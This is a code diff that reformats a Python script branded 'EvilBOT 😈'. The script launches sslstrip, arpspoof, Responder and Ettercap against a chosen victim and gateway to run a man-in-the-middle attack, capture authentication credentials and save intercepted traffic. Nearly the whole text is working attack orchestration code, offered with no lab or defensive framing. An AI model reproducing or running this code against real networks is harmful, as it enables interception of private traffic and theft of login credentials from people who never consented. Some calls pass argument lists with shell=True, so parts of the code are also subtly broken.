@@ -9,17 +9,20 @@ def start_sslstrip(interface):
 
 def start_arpspoof(interface, victim_ip, gateway_ip):
     print("<EvilBOT 😈>: Starting ARP Spoofing...")
-    subprocess.run(['arpspoof', '-i', interface, '-t', victim_ip, gateway_ip], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    subprocess.run(['arpspoof', '-i', interface, '-t', victim_ip, gateway_ip], shell=True, stdout=subprocess.PIPE,
+                   stderr=subprocess.PIPE)
 
 
 def start_responder(interface):
     print("<EvilBOT 😈>: Starting Responder...")
-    subprocess.run(['responder', '-I', interface, '-rdwbfv'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    subprocess.run(['responder', '-I', interface, '-rdwbfv'], shell=True, stdout=subprocess.PIPE,
+                   stderr=subprocess.PIPE)
 
 
 def start_ettercap(interface):
     print("<EvilBOT 😈>: Starting Ettercap...")
-    subprocess.run(['ettercap', '-TqM', 'arp:remote', '-i', interface, '-S', '-L', '-w', 'captured.pcap'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    subprocess.run(['ettercap', '-TqM', 'arp:remote', '-i', interface, '-S', '-L', '-w', 'captured.pcap'], shell=True,
+                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 
 def mitm():
@@ -36,13 +39,17 @@ def mitm():
     sslstrip_process = subprocess.Popen(['sslstrip', '-i', interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     # Use arpspoof to perform ARP spoofing
-    arpspoof_process = subprocess.Popen(['arpspoof', '-i', interface, '-t', victim_ip, gateway_ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    arpspoof_process = subprocess.Popen(['arpspoof', '-i', interface, '-t', victim_ip, gateway_ip],
+                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     # Use responder to capture authentication credentials
-    responder_process = subprocess.Popen(['responder', '-I', interface, '-rdwbfv'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    responder_process = subprocess.Popen(['responder', '-I', interface, '-rdwbfv'], stdout=subprocess.PIPE,
+                                         stderr=subprocess.PIPE)
 
     # Use Ettercap to sniff and modify network traffic
-    ettercap_process = subprocess.Popen(['ettercap', '-TqM', 'arp:remote', '-i', interface, '-S', '-L', '-w', 'captured.pcap'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    ettercap_process = subprocess.Popen(
+        ['ettercap', '-TqM', 'arp:remote', '-i', interface, '-S', '-L', '-w', 'captured.pcap'], stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE)
 
     # Store all subprocesses in a list for monitoring
     processes = [sslstrip_process, arpspoof_process, responder_process, ettercap_process]
@@ -60,9 +67,8 @@ def mitm():
 
     # Check for errors in subprocesses
     for p in processes:
-            if p.returncode != 0:
+        if p.returncode != 0:
             print(f"Error in process {p.args}")
             print(p.stderr)
             return
     print("<EvilBOT 😈>: MITM attack complete.")
-
